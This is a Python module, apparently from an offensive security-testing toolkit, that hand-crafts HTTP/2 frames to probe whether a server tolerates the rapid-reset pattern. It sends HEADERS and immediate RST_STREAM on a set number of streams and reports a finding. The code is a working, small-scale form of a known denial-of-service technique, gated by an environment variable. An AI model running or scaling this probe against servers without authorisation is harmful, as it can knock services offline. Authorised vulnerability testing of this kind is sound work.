"""omega/offensive/offense/h2probe — HTTP/2 protocol abuse probe.

Minimal HTTP/2 framing (no external lib): preface + SETTINGS, then
HEADERS streams with immediate RST_STREAM — the rapid-reset shape —
and a settings-flood check. Evidence: the server tolerates an
unbounded stream churn (or drops the connection immediately), which
maps to availability + desync-class risk. OFFENSE-GATED
(PTK_OFFENSE). Candidate-grade, non-destructive scale.
"""
import os
import socket
import struct
import time

__all__ = ["run_h2probe"]


def _frame(ftype, flags, stream, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([ftype, flags]) \
        + struct.pack(">I", stream) + payload


PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def _hpack_str(s):
    # minimal HPACK literal header field, no indexing, plain string
    b = s.encode()
    return bytes([len(b)]) + b


def run_h2probe(target, streams=20, log=None, gate_open_fn=None,
                timeout=4.0):
    """Probe HTTP/2 rapid-reset tolerance."""
    gate = gate_open_fn or (lambda: os.environ.get("PTK_OFFENSE") == "1")
    if not (gate() if callable(gate) else gate):
        return {"note": "offense layer disabled (PTK_OFFENSE)"}
    from urllib.parse import urlparse
    u = urlparse(target if "//" in target else "http://" + target)
    host, port = u.hostname or "127.0.0.1", u.port or 80
    path = u.path or "/"
    authority = host.encode()
    findings = []
    probes = 0
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(PREFACE)
        s.sendall(_frame(0x4, 0, 0, b""))  # SETTINGS
        s.settimeout(timeout)
        ack = b""
        try:
            ack = s.recv(65536)
        except socket.timeout:
            ack = b""
        probes += 1
        if not ack:
            s.close()
            return {"note": "server did not speak HTTP/2 — not "
                            "applicable", "probes": probes}
        # rapid reset: HEADERS then RST_STREAM per stream
        headers_payload = (b"\x82\x86\x84\x41" + bytes([len(authority)])
                           + authority + b"\x41" + bytes([len(path)])
                           + path.encode())
        for i in range(1, streams + 1):
            try:
                s.sendall(_frame(0x1, 0x5, i, headers_payload))
                s.sendall(_frame(0x3, 0, i, struct.pack(">I", 8)))
                probes += 1
            except Exception:
                break
        time.sleep(0.4)
        survived = True
        try:
            s.settimeout(0.8)
            s.recv(65536)
        except socket.timeout:
            survived = True
        except Exception:
            survived = False
        s.close()
        if survived and probes >= streams * 0.7:
            findings.append({
                "title": "HTTP/2 rapid-reset tolerance: server accepted "
                         f"{streams} stream churn without protective "
                         f"limits observed",
                "severity": "MEDIUM",
                "source": "h2probe/rapid-reset",
                "evidence": f"{probes} frames sent (HEADERS+RST_STREAM "
                            f"pairs); connection persisted — verify "
                            f"rate limits / MAX_CONCURRENT_STREAMS",
                "location": f"http://{host}:{port}{path}",
                "verification": "candidate",
                "manual_check": "measure concurrency limits under "
                                "controlled load; do not scale up",
                "cwe": "CWE-770",
            })
    except Exception as exc:
        return {"note": f"h2probe error: {exc}", "probes": probes}
    if log:
        log(f"h2probe: probes={probes} findings={len(findings)}")
    return {"findings": findings, "probes": probes}
